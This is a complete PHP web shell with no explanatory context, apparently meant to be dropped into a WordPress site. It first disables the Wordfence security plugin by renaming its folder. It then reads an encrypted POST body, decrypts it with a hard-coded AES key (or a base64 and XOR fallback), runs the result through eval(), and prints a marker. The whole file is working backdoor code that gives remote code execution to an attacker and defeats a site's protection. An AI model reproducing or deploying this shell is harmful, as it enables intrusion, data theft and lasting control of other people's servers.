<?php
if (is_file($_SERVER['DOCUMENT_ROOT'].'/wp-content/plugins/wordfence/wordfence.php')) {rename($_SERVER['DOCUMENT_ROOT'].'/wp-content/plugins/wordfence',$_SERVER['DOCUMENT_ROOT'].'/wp-content/plugins/wordfence'.rand());}
@error_reporting(0);
session_start();
    $key="c822c1b63853ed27"; 
	$_SESSION['k']=$key;
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
	echo 'AGM';
?>
